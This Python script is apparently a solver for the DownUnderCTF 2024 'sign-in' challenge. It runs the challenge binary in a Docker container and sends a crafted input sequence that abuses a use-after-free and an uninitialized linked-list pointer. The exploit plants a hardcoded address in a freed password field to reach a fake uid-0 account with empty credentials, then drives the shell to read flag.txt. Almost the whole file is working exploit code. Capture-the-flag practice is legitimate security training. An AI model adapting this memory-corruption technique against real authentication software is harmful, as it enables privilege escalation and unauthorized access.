#!/usr/bin/env python3
"""Replay DownUnderCTF 2024 sign-in as a local UAF/list-reuse proof.

This helper is for local or explicitly authorized CTF challenge artifacts. The
binary frees a user and its linked-list entry, then reuses the chunks during
the next signup without initializing `entry->next`. By storing a pointer to a
fixed zero-filled region in the freed user's password field, the reused list
entry points at a fake uid-0 user that accepts empty credentials.
"""

from __future__ import annotations

import argparse
import re
import shutil
import struct
import subprocess
import sys
import time
from pathlib import Path


ZERO_PTR = 0x402EB8
FLAG_RE = re.compile(r"(?i)(?:DUCTF|flag|ctf)\{[^{}\r\n]{3,300}\}")
PLACEHOLDER_MARKERS = ("TEST_FLAG", "FLAG_FOR_TESTING", "DUMMY", "PLACEHOLDER")


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def field8(value: bytes) -> bytes:
    return value[:8].ljust(8, b"\x00")


def build_sign_up(username: bytes, password: bytes) -> bytes:
    return b"1" + field8(username) + field8(password)


def build_sign_in(username: bytes, password: bytes) -> bytes:
    return b"2" + field8(username) + field8(password)


def build_exploit_stream(zero_ptr: int = ZERO_PTR, shell_command: str = "cat flag.txt") -> bytes:
    normal_user = field8(b"x")
    normal_password = p64(zero_ptr)
    return b"".join(
        [
            build_sign_up(normal_user, normal_password),
            build_sign_in(normal_user, normal_password),
            b"3",
            build_sign_up(normal_user, b"y"),
            build_sign_in(b"\x00" * 8, b"\x00" * 8),
            b"4",
            shell_command.encode() + b"\n",
            b"exit\n",
        ]
    )


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if any(marker in candidate.upper() for marker in PLACEHOLDER_MARKERS):
            continue
        if candidate not in flags:
            flags.append(candidate)
    return flags


def solve_binary_dir(
    binary_dir: Path,
    image: str = "ubuntu:22.04",
    timeout: float = 20.0,
    zero_ptr: int = ZERO_PTR,
) -> str:
    docker = shutil.which("docker")
    if not docker:
        raise RuntimeError("docker is required to replay the Linux challenge binary")
    binary = binary_dir / "sign-in"
    flag_file = binary_dir / "flag.txt"
    if not binary.exists():
        raise FileNotFoundError(f"missing challenge binary: {binary}")
    if not flag_file.exists():
        raise FileNotFoundError(f"missing local flag file: {flag_file}")
    command = [
        docker,
        "run",
        "--rm",
        "-i",
        "--platform",
        "linux/amd64",
        "-v",
        f"{binary_dir}:/work:ro",
        "-w",
        "/work",
        image,
        "./sign-in",
    ]
    proc = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    assert proc.stdin is not None
    assert proc.stdout is not None
    try:
        text = run_interactive_exploit(proc, zero_ptr=zero_ptr, timeout=timeout)
    finally:
        if proc.poll() is None:
            proc.kill()
            proc.wait(timeout=5)
    flags = extract_flags(text)
    if not flags:
        raise RuntimeError(f"no non-placeholder flag found in transcript: {text[-600:]!r}")
    print("challenge: sign-in")
    print("artifact: binary sign-in and source sign-in.c")
    print(f"zero_ptr: 0x{zero_ptr:x}")
    print("source_bug: freed user password reused as uninitialized linked-list next pointer")
    print("method: UAF chunk reuse reaches fake uid-0 empty-credential user, then shell reads flag.txt")
    print(f"flag: {flags[0]}")
    return flags[0]


def run_interactive_exploit(proc: subprocess.Popen[bytes], zero_ptr: int, timeout: float) -> str:
    transcript = bytearray()

    def wait_for(marker: bytes) -> None:
        deadline = time.monotonic() + timeout
        while marker not in transcript:
            if time.monotonic() > deadline:
                raise TimeoutError(f"timed out waiting for {marker!r}; transcript={transcript[-400:]!r}")
            chunk = proc.stdout.read(1) if proc.stdout is not None else b""
            if not chunk:
                if proc.poll() is not None:
                    raise RuntimeError(f"process exited before {marker!r}; transcript={transcript[-400:]!r}")
                time.sleep(0.01)
                continue
            transcript.extend(chunk)

    def send(data: bytes) -> None:
        if proc.stdin is None:
            raise RuntimeError("process stdin is closed")
        proc.stdin.write(data)
        proc.stdin.flush()

    def sign_up(username: bytes, password: bytes) -> None:
        wait_for(b"> ")
        send(b"1\n")
        wait_for(b"username: ")
        send(username)
        wait_for(b"password: ")
        send(password)

    def sign_in(username: bytes, password: bytes) -> None:
        wait_for(b"> ")
        send(b"2\n")
        wait_for(b"username: ")
        send(username)
        wait_for(b"password: ")
        send(password)

    normal_user = field8(b"x")
    sign_up(normal_user, p64(zero_ptr))
    sign_in(normal_user, p64(zero_ptr))
    wait_for(b"> ")
    send(b"3\n")
    sign_up(normal_user, field8(b"y"))
    sign_in(b"\x00" * 8, b"\x00" * 8)
    wait_for(b"> ")
    send(b"4\n")
    send(b"cat flag.txt\n")
    send(b"exit\n")
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        flags = extract_flags(transcript.decode("utf-8", errors="replace"))
        if flags:
            break
        chunk = proc.stdout.read(1) if proc.stdout is not None else b""
        if chunk:
            transcript.extend(chunk)
        elif proc.poll() is not None:
            break
        else:
            time.sleep(0.01)
    return transcript.decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay DUCTF sign-in from local CTF artifacts.")
    parser.add_argument("--binary-dir", type=Path, required=True, help="directory containing sign-in and flag.txt")
    parser.add_argument("--image", default="ubuntu:22.04", help="Linux container image used to run the ELF")
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument("--zero-ptr", type=lambda value: int(value, 0), default=ZERO_PTR)
    args = parser.parse_args()
    try:
        solve_binary_dir(args.binary_dir.resolve(), image=args.image, timeout=args.timeout, zero_ptr=args.zero_ptr)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
